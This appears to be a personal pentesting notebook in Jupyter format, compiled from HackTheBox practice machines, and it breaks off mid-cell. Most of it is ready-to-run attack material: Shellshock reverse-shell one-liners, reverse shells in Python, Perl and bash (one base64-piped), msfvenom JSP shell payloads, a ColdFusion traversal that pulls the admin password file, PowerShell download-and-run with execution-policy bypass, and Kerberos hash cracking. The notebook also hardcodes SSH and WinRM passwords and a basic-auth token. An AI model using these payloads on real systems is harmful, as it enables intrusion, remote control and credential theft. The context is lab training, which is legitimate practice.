{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# myHack the Notebook\n",
    "This notebook lists various tactics and techniques used in pentesting.\n",
    "\n",
    "Created the notebook as I worked through various machines from hackthebox and other locations/sites"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Global Settings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Output Directory:/home/kali/hackthebox/output\n",
      "Box Directory:/home/kali/hackthebox/output/ypuffer\n"
     ]
    }
   ],
   "source": [
    "# Box Information\n",
    "nickname = \"ypuffer\"        \n",
    "dnsName = \"docker.registry.htb\"\n",
    "destDNS = dnsName\n",
    "destIP = '10.10.10.107'\n",
    "\n",
    "vpnIP = \"10.10.14.19\"\n",
    "\n",
    "# SSH Configuration\n",
    "# doctors.htb\n",
    "import paramiko\n",
    "sshport = 22\n",
    "username = \"xalvas\"\n",
    "password = \"18547936..*\"\n",
    "sshKey=\"/home/kali/hackthebox/output/traverxec/id_rsa\"\n",
    "\n",
    "# WinRM Configuration\n",
    "winrmpass = winrmpassword = \"Thestrokes23\"\n",
    "\n",
    "####\n",
    "# Create the Output Directory for the Below Information Gathered\n",
    "currentDir = \"/home/kali/hackthebox\"\n",
    "outputDir = currentDir + \"/output\"\n",
    "print(\"Output Directory:\" + outputDir)\n",
    "!mkdir -p $outputDir\n",
    "\n",
    "# Create directories for the box\n",
    "boxDir = outputDir + \"/\" + nickname\n",
    "print(\"Box Directory:\" + boxDir)\n",
    "!mkdir -p $boxDir"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"index\"></a>\n",
    "## Index\n",
    "\n",
    "#### Steps of Penetration Testing\n",
    "````\n",
    "1. Reconnaissance\n",
    "2. Assess Vulnerabilities\n",
    "3. Exploit\n",
    "4. Maintain Access\n",
    "5. Privilege Escalate\n",
    "6. Maintain Elevated Access\n",
    "7. Lateral Movement\n",
    "8. Artifact Collection\n",
    "9. Reporting\n",
    "````\n",
    "\n",
    "\n",
    "### Reconnaissance\n",
    "\n",
    "[dirb](#dirb)\n",
    "\n",
    "[ffuf](#ffuf)\n",
    "\n",
    "[gobuster](#gobuster)\n",
    "\n",
    "[nikto](#nikto)\n",
    "\n",
    "[nmap Port Scan Quick](#nmap)\n",
    "\n",
    "[nmap Port Scan UDP](#nmapudp)\n",
    "\n",
    "[nmap Discover Versions](#nmapsv)\n",
    "\n",
    "[nmap all the ports](#nmapall)\n",
    "\n",
    "[smbclient](#smbclient)\n",
    "\n",
    "[snmpwalk](#snmpwalk)\n",
    "\n",
    "\n",
    "\n",
    "### Assess Vulnerabilities\n",
    "\n",
    "[nmap scripts default and safe](#nmapscripts)\n",
    "\n",
    "\n",
    "\n",
    "### Exploit\n",
    "\n",
    "[bash Reverse Shell](#bashreverse)\n",
    "\n",
    "[curl (GET)](#curlget)\n",
    "\n",
    "[Impacket - GetNPUsers](#getnpusers)\n",
    "\n",
    "[john the ripper](#john)\n",
    "\n",
    "[LDAP Search](#ldapsearch)\n",
    "\n",
    "[ltrace](#ltrace)\n",
    "\n",
    "[metasploit multi-handler](#multihandler)\n",
    "\n",
    "[msfvenom payloads](#msfvenom)\n",
    "\n",
    "[Perl Commands Reverse Shell](#perl)\n",
    "\n",
    "[Powershell Download](#powerget)\n",
    "\n",
    "[Python Upgrade Shell](#pythonu)\n",
    "\n",
    "[Python Reverse Shell](#python)\n",
    "\n",
    "[sqlmap](#sqlmap)\n",
    "\n",
    "[SQL Injection](#sqlinject)\n",
    "\n",
    "[smbmount](#smbmount)\n",
    "\n",
    "[SSH Paramiko (Execute Commands)](#sshp)\n",
    "\n",
    "[SSH Paramiko (Copy Files)](#sshpcopy)\n",
    "\n",
    "[SSH Paramiko (Execute Linpeas)](#sshp-peas)\n",
    "\n",
    "[SSH Paramiko (Linux Exploit Suggester)](#sshp-suggest)\n",
    "\n",
    "[wget (GET)](#wgetget)\n",
    "\n",
    "[WinRM](#winrm)\n",
    "\n",
    "\n",
    "\n",
    "### Maintain Access (Pesistance - User Level)\n",
    "\n",
    "\n",
    "\n",
    "### Privilege Escalate\n",
    "\n",
    "[Enumerating SUID Binaries](#findsuid)\n",
    "\n",
    "[Linux privesc](#linuxprivesc)\n",
    "\n",
    "[SSH Paramiko (Run Linpeas)](#sshp-peas)\n",
    "\n",
    "[SSH Paramiko (Linux Exploit Suggester)](#sshp-suggest)\n",
    "\n",
    "[Windows privesc](#windowsprivesc)\n",
    "\n",
    "\n",
    "\n",
    "### Maintain Elevated Access (Persistance - Root Level)\n",
    "\n",
    "\n",
    "\n",
    "### Lateral Movement\n",
    "\n",
    "\n",
    "\n",
    "### Artifact Collection\n",
    "\n",
    "[ Stego with steghide](#stego)\n",
    "\n",
    "\n",
    "### Reporting\n",
    "\n",
    "\n",
    "\n",
    "### Additional Notes for Specific Scenarios\n",
    "\n",
    "[rpcinfo and showmount for NFS Shares](#rpcinfo)\n",
    "\n",
    "[Flask Debug Console](#flaskdebug)\n",
    "\n",
    "[Flask Template Injection](#flasktemplate)\n",
    "\n",
    "[Jenkins Script Console](#jenkins)\n",
    "\n",
    "less - Execute commands from inside of less by ! followed by the command\n",
    "\n",
    "mysql - Execute commands from inside of mysql with \\! followed by the command\n",
    "\n",
    "[JWT Token Manipulation](#jwttoken)\n",
    "\n",
    "\n",
    "\n",
    "### Notebooks for Specific Scenarios\n",
    "\n",
    "[ Interaction with PHP Shell ](./Linux_Add_Persistance.ipynb)\n",
    "\n",
    "[ gdb Linux Binary Exploitation ](./gdbLinuxBinaryExploitation.ipynb)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmap\"></a>\n",
    "## nmap \n",
    "Very quick scan to discover open ports\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Command: nmap -p- --min-rate=1000 -T4 --ipaddr-- -oN nmap"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-28 23:59 EST\r\n"
     ]
    }
   ],
   "source": [
    "outputLocation = boxDir + '/nmap.txt'\n",
    "#!nmap -p- --min-rate=1000 -T4 $destIP -oN $outputLocation\n",
    "!nmap -Pn -p- --min-rate=1000 -T4 $destIP -oN $outputLocation\n",
    "f = open(outputLocation)\n",
    "openPortsList = []\n",
    "for line in f:\n",
    "    if \"/tcp\" in line:\n",
    "        items = line.split(\"/\")\n",
    "        openPortsList.append(items[0])\n",
    "strOpenPorts = \"\"\n",
    "for port in openPortsList:\n",
    "    strOpenPorts += port + \",\"\n",
    "strOpenPorts = strOpenPorts[:-1]\n",
    "#print(strOpenPorts)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmapudp\"></a>\n",
    "## nmap UDP\n",
    "Very quick scan to discover open ports\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Requires root privileges\n",
    "outputLocation = boxDir + '/nmapUDP.txt'\n",
    "print(\"sudo nmap -sU -F --max-retries 0 \" + destIP + \" -oN \" + outputLocation)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmapsv\"></a>\n",
    "## nmap -sV \n",
    "Discovers the version of the services running if available\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Command: nmap -sV --ipaddr-- -oN nmapsv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "outputLocation = boxDir + '/nmapsv.txt'\n",
    "#!nmap -Pn -sV $destIP -oN $outputLocation\n",
    "!nmap -Pn -p$strOpenPorts -sV $destIP -oN $outputLocation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmapall\"></a>\n",
    "## nmap All TCP ports\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Command: nmap -sV -p- --ipaddr-- -oN nmap"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Not necessary now...\n",
    "outputLocation = boxDir + '/nmapAll.txt'\n",
    "!nmap -sV -p- $destIP -oN $outputLocation"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nmapscripts\"></a>\n",
    "## nmap scripts default,safe\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Command: nmap -sV --scripts default,safe --ipaddr-- -oN nmapScripts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "outputLocationScripts = boxDir + '/nmapScripts.txt'\n",
    "#!nmap -p80 -Pn -sV --script default,safe $destIP -oN $outputLocationScripts\n",
    "!nmap -p$strOpenPorts -Pn -sV --script default,safe $destIP -oN $outputLocationScripts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Shellshock Check\n",
    "#!nmap -sV -p- --script http-shellshock $destIP\n",
    "!nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls $destIP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"nikto\"></a>\n",
    "## nikto\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "### nikto settings\n",
    "outputLocationNikto = boxDir + \"/nikto.csv\"\n",
    "url=\"http://\" + dnsName\n",
    "!nikto -h $destIP -o $outputLocationNikto -p 80\n",
    "#!nikto -h $url -o $outputLocationNikto\n",
    "\n",
    "# Below is how to scan multiple ports\n",
    "#!nikto -h $destIP -o $outputLocation -p 80,443  "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"stego\"></a>\n",
    "## Stego with Steghide\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "steghide --extract -p --password-- -sf --file--\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"dirb\"></a>\n",
    "## dirb\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "### dirb settings\n",
    "outputLocationDirb = boxDir + \"/dirb.txt\"\n",
    "outputLocationDirbSubD = boxDir + \"/dirb-subdir.txt\"\n",
    "#url=\"http://\" + dnsName\n",
    "url=\"http://\" + destIP\n",
    "#url = \"http://\" + destIP + \":50000\"\n",
    "wordlist=\"/usr/share/wordlists/dirb/common.txt\"\n",
    "#wordlist=\"/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt\"\n",
    "# -w does not stop on warning messages\n",
    "!dirb $url $wordlist -w -o $outputLocationDirb\n",
    "subdir = url + \"/cgi-bin/\"\n",
    "# -X search for files with the extension of sh \n",
    "#!dirb $subdir -X .sh -o $outputLocationDirb\n",
    "\n",
    "#!dirb $url -o $outputLocationDirb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"gobuster\"></a>\n",
    "## gobuster\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# gobuster is not installed by default on kali (apt install gobuster)\n",
    "outputLocationGoBuster = boxDir + \"/gobuster.txt\"\n",
    "url=\"http://\" + destIP\n",
    "wordlist=\"/usr/share/wordlists/dirb/common.txt\"\n",
    "# -x is a comma seperated list of extensions to test\n",
    "!gobuster dir -u $url -w $wordlist -x txt,pdf,php --wildcard\n",
    "#!gobuster dir -u $url -w $wordlist"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"ffuf\"></a>\n",
    "## ffuf\n",
    "Faster than dirb...\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# ffuf is not installed by default on kali (apt install ffuf)\n",
    "outputLocationGoBuster = boxDir + \"/ffuf.txt\"\n",
    "url=\"http://\" + destIP + \"/FUZZ\"\n",
    "print(url)\n",
    "wordlist=\"/usr/share/wordlists/dirb/common.txt\"\n",
    "!ffuf -u $url -w $wordlist"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"smbclient\"></a>\n",
    "## smbclient\n",
    "\n",
    "[Back to Index](#index)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!smbclient -L $destIP -U anonymous --no-pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"smbmount\"></a>\n",
    "## smbmount\n",
    "\n",
    "[Back to Index](#index)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# smbmount /////--ipaddr or name--//share --folder--"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"curlget\"></a>\n",
    "## curl (GET)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# The following command is a directory traversal on CFIDE to get the administrator password\n",
    "#curlURL = \"http://\" + destIP \n",
    "curlURL = \"http://\" + destIP + \":8500\" + \"/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en\"\n",
    "#!curl -X GET $curlURL\n",
    "resultsCurl = !curl -X GET $curlURL\n",
    "for line in resultsCurl:\n",
    "    if \"password\" in line:\n",
    "        print(line)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Challenge Emdee five for life\n",
    "# Completed\n",
    "import re\n",
    "import requests\n",
    "import hashlib\n",
    "\n",
    "curlURL = \"http://178.128.40.63:32544/\"\n",
    "# GET Results\n",
    "print(\"GET Results\")\n",
    "getResults = requests.get(curlURL, stream=True)\n",
    "phpSessionString = getResults.headers['Set-Cookie']\n",
    "phpSessionString = re.sub(\"PHPSESSID=\",\"\", phpSessionString)\n",
    "phpSessionString = re.sub(\";.+\",\"\", phpSessionString)\n",
    "print(\"PHP Session: \" + phpSessionString)\n",
    "savedResults = \"\"\n",
    "for line in getResults.iter_lines():\n",
    "    line = line.decode(\"utf-8\")\n",
    "    savedResults += line + \"\\n\"\n",
    "    if \"MD5 en\" in line:\n",
    "        line = re.sub(\".+<h3 align='center'>\", \"\", line)\n",
    "        line = re.sub(\"</h3>.+\", \"\", line)\n",
    "        print(\"Line in File: \" + line)\n",
    "        strLine = line\n",
    "strHash = hashlib.md5(strLine.encode(\"utf-8\")).hexdigest()\n",
    "print(\"Hash Submitted: \" + strHash)\n",
    "print(\"\\n-----------Results--------------\")\n",
    "print(savedResults)\n",
    "print(\"--------------------------------\\n\\n\")\n",
    "\n",
    "# POST Results\n",
    "count = 1\n",
    "while (count < 5):\n",
    "    print(\"\\nPOST Results - \" + str(count))\n",
    "    postObj = {'hash': strHash}\n",
    "    cookies = {'PHPSESSID': phpSessionString}\n",
    "    results = requests.post(curlURL, data = postObj, cookies=cookies, stream=True)\n",
    "    phpSessionStringPOST = results.headers\n",
    "    #phpSessionString = re.sub(\"PHPSESSID=\",\"\", phpSessionString)\n",
    "    #phpSessionString = re.sub(\";.+\",\"\", phpSessionString)\n",
    "    print(\"POST PHP Session: \" + str(phpSessionStringPOST))\n",
    "    savedResults = \"\"\n",
    "    for line in results.iter_lines():\n",
    "        line = line.decode(\"utf-8\")\n",
    "        savedResults += line + \"\\n\"\n",
    "        if \"MD5 en\" in line:\n",
    "            line = re.sub(\".+<h3 align='center'>\", \"\", line)\n",
    "            line = re.sub(\"</h3>.+\", \"\", line)\n",
    "            print(\"Line in File: \" + line)\n",
    "            strLine = line\n",
    "    strHash = hashlib.md5(strLine.encode(\"utf-8\")).hexdigest()\n",
    "    print(\"Hash Submitted: \" + strHash)\n",
    "    print(\"\\n-----------Results--------------\")\n",
    "    print(savedResults)\n",
    "    print(\"--------------------------------\\n\\n\")\n",
    "    count += 1\n",
    "\n",
    "        "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### curl (POST)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!curl -d \"xyz=ls\" -X POST http://192.168.113.169/test/.cache.php"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### curl (Authorization Basic Header)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": false
   },
   "outputs": [],
   "source": [
    "curlURL = \"http://\" + destDNS + \"/v2\"\n",
    "# Reference: Registry\n",
    "apiFunction = \"/_catalog\"  # bolt-image\n",
    "apiFunction = \"/bolt-image/tags/list\" # boltimage latest\n",
    "apiFunction = \"/bolt-image/manifests/latest\" \n",
    "# You can download the blobSum for the images - Search and Plunder\n",
    "# Password found from below... GkOcz221Ftb3ugog\n",
    "#apiFunction = \"/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b\"\n",
    "apiFunction = \"/bolt-image/blobs/sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff\"\n",
    "page = curlURL + apiFunction\n",
    "basicAuth = 'Authorization: Basic YWRtaW46YWRtaW4='\n",
    "\n",
    "#print(\"!curl \" + page + \" -H '\" + basicAuth + \"'\")\n",
    "#!curl $page -H 'Authorization: Basic YWRtaW46YWRtaW4='\n",
    "\n",
    "# To save output\n",
    "!curl $page -H 'Authorization: Basic YWRtaW46YWRtaW4=' -o $boxDir/f476d6.gz\n",
    "!cat $boxDir/list.txt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"wgetget\"></a>\n",
    "## wget (GET)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Shellshock with reverse shell - Found the user.sh file using dirb\n",
    "wget -U \"() { :;}; echo Content-Type: text/html; echo; echo; /bin/bash -i >& /dev/tcp/10.10.14.4/4545 0>&1\" http://10.10.10.56/cgi-bin/user.sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"powerget\"></a>\n",
    "## Powershell (GET)\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Newer versions of powershell support the Invoke-Webrequest\n",
    "````\n",
    "$url = \"http://10.10.14.3:8090/Chimichurri.exe\"\n",
    "$output = \"c.exe\"\n",
    "Invoke-WebRequest -Uri $url -OutFile $output\n",
    "````\n",
    "\n",
    "With older versions of powershell you need to use .NET\n",
    "````\n",
    "$w = New-Object System.Net.WebClient\n",
    "$url = \"http://10.10.14.10:8090/file.exe\"\n",
    "$output = \"output.exe\"\n",
    "$w.DownloadFile($url, $file)\n",
    "````\n",
    "The above options can be bundled into a ps1 file and executed.\n",
    "\n",
    "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"john\"></a>\n",
    "## John the Ripper\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "### Output Location\n",
    "outputLocationJohn = boxDir + \"/hash.txt\"\n",
    "saveFile = boxDir + \"/john.output\"\n",
    "# Kerberos hashes from Impacket NPUsers does not load properly below, manually load to hash.txt\n",
    "#hash='$krb5asrep$fsmith@EGOTISTICAL-BANK.LOCAL:c5fcbfe4f219b5dd5f8634bd4d67a9d0$99493b26fcd0da4d002167e6d3a55fdaf34ff7371eb335be2a5869f33b771351a1051ce3e8585a20ccbbd440a88ed7d7ba63dcbfc61fae67dc31331b106a2a84fbc299d8ff5f60b017b7b182d3712133d6cf31de66f5ee2ed572fdbbfd8c99330d4065e66438b1e6ba6322da2ddc15c23e234aa0fc82ed349e8a48e2525d1f766fddfd859386e2e333c4a7cdecae6a7a182b3113b05706038c94007f1016d9a69a1ed079ceef8377bce3cbde6b8967f9139b8038a5bc5981ce17101daa427959ca5ccbef9afa153af4743b8024052347be335bba1c986c26572ce935844f08ee34358a6f4d33ef5bb9495f350f99b863a69dd8fb18206f7c1d5a8100bae19ef7'\n",
    "#!echo $hash > $outputLocationJohn\n",
    "# Display the file with the hash in it\n",
    "#!cat $outputLocationJohn\n",
    "\n",
    "# Using Default John wordlist\n",
    "#!/usr/sbin/john $outputLocationJohn > $saveFile\n",
    "\n",
    "# Using Rockyou or a selected wordlist\n",
    "!/usr/sbin/john -wordlist=/usr/share/wordlists/rockyou.txt $outputLocationJohn > $saveFile\n",
    "!cat $saveFile"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Extract password hash from id_rsa private key\n",
    "A warning appears as if it did not work\n",
    "````\n",
    "python3 /usr/share/john/ssh2john.py id_rsa > hash.txt\n",
    "Execute john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n",
    "````"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"msfvenom\"></a>\n",
    "## msfvenom payload Creation\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Reference: https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create an executable that can be run as a windows service to start a bind shell\n",
    "````\n",
    "msfvenom -p windows/x64/meterpreter/bind_tcp lport=8090 -f exe-service\n",
    "````\n",
    "\n",
    "Schedule Task on Coldfusion 8\n",
    "````\n",
    "msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=8090 -f raw > cold.jsp\n",
    "````"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "outputLocationPayload = boxDir + \"/payload.jsp\"\n",
    "!msfvenom -p  java/jsp_shell_reverse_tcp LHOST=10.10.14.3 LPORT=8090 -f raw > $outputLocationPayload"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"pythonu\"></a>\n",
    "## Python Commands (Upgrade Shell)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"python -c \\\"import pty; pty.spawn('/bin/bash')\\\"\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"python\"></a>\n",
    "## Python Commands (Reverse Shell)\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "````\n",
    "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.14\",8091));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'  \n",
    "````\n",
    "\n",
    "Using the above in conjunction with wget to have a reverse shell\n",
    "````\n",
    "wget 10.10.14.14/htb/t.py -O /tmp/t.py; python /tmp/t.py\n",
    "````\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "reverseshellPort = \"8090\"\n",
    "print(\"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"\" + vpnIP + \"\\\",\" + reverseshellPort + \"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"bashreverse\"></a>\n",
    "## Bash (Reverse Shell)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "reverseshellPort = 8090\n",
    "b64 = !echo \"/bin/bash -i >& /dev/tcp/$vpnIP/$reverseshellPort 0>&1\" | base64\n",
    "#cmd = \"AB; echo \" + b64[0] + \" | base64 -d | bash' \"\n",
    "cmd = \"echo \" + b64[0] + \" | base64 -d | bash\"\n",
    "print (cmd)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "reverseshellPort = 8090\n",
    "print(\"/bin/bash -i >& /dev/tcp/\" + vpnIP + \"/\" + str(reverseshellPort) + \" 0>&1\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"perl\"></a>\n",
    "## Perl Commands (Reverse Shell)\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# For commands through a shell using perl (with sudo privileges)\n",
    "# sudo /usr/bin/perl -e 'exec \"cat /root/root.txt\"'\n",
    "\n",
    "# The below spawns nc as root - Had to download /usr/bin/nc from kali due to a different version on the box\n",
    "# sudo /usr/bin/perl -e 'exec \"/home/shelly/nc 10.10.14.4 8090 -e /bin/bash\"'\n",
    "\n",
    "# Perl Reverse Shell\n",
    "# Reference: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\n",
    "# sudo perl -e 'use Socket;$i=\"10.10.14.4\";$p=4500;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"multihandler\"></a>\n",
    "## Metasploit Multi-Handler Setup\n",
    "\n",
    "[Back to Index](#index)\n",
    "\n",
    "Setup: Creates a multihandler file for a metasploit payload being executed or other payload that could connect back"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "port=8090\n",
    "outputLocationmhandler = boxDir + \"/mhandler.rc\"\n",
    "f = open(outputLocationmhandler, 'w')\n",
    "f.write(\"use exploit/multi/handler\")\n",
    "f.write(\"set payload windows/x64/meterpreter/bind_tcp\")\n",
    "f.write(\"set RHOSTS \" + destIP)\n",
    "f.write(\"set RPORT \" + str(port))\n",
    "f.close()\n",
    "\n",
    "print(\"Execute to Start: msfconsole -r \" + outputLocationmhandler)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id=\"sshp\"></a>\n",
    "## SSH Paramiko (Execute Commands)\n",
    "\n",
    "### Creates a journal file that can be viewed\n",
    "\n",
    "[Back to Index](#index)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "#commandList = ['uname -a']\n",
    "commandList = ['whoami', 'uname -a', 'ps -aef --forest', 'netstat -anop', 'cat /etc/passwd', 'cat /etc/crontab', 'ls -lhaR /var/www']\n",
    "#commandList = ['cat /var/www/html/backup.php']\n",
    "#commandList += ['ls -lha /var/www/html/bolt']\n",
    "\n",
    "# To investigate a process use the below...\n",
    "processID = \"1225\"\n",
    "pcmd = \"ls -la /proc/\" + processID + \"/cwd\"\n",
    "pcmd2 = \"ss -anp | grep \" + processID\n",
    "#commandList = [pcmd, pcmd2] \n",
    "\n",
    "ssh = paramiko.SSHClient()\n",
    "ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
    "# Below is used with a password\n",
    "#ssh.connect(destIP, sshport, username, password)\n",
    "\n",
    "# Below is used with a SSH key\n",
    "# By default the key generated is OPENSSH convert to RSA by ssh-keygen -p -m PEM -f ~/.ssh/id_rsa\n",
    "ssh.connect(hostname=destIP, username=username, password=password, key_filename=sshKey)\n",
    "\n",
    "# Record output in journal\n",
    "outputLocationJournal = boxDir + \"/journal.txt\"\n",
    "f = open(outputLocationJournal, 'a')\n",
    "for c in commandList:\n",
    "    stdin, stdout, stderr = ssh.exec_command(c)\n",
    "    jlines = stdout.readlines()\n",
    "    #print(jlines)\n",
    "    print(\"\\nCommand: \" + c)\n",
    "    print(\"Output\")\n",
    "    for j in jlines:\n",
    "        print(j.strip())\n",
    "\n",
    "    f.write(\"\\n\\nCommand: \" + c)\n",
    "    f.write(\"\\nOutput\\n\")\n",
    "    for jline in jlines:\n",
    "        f.write(jline)\n",
    "f.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### View Journal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "!cat $outputLocationJournal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Roll Journal  (Warning clears Journal)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
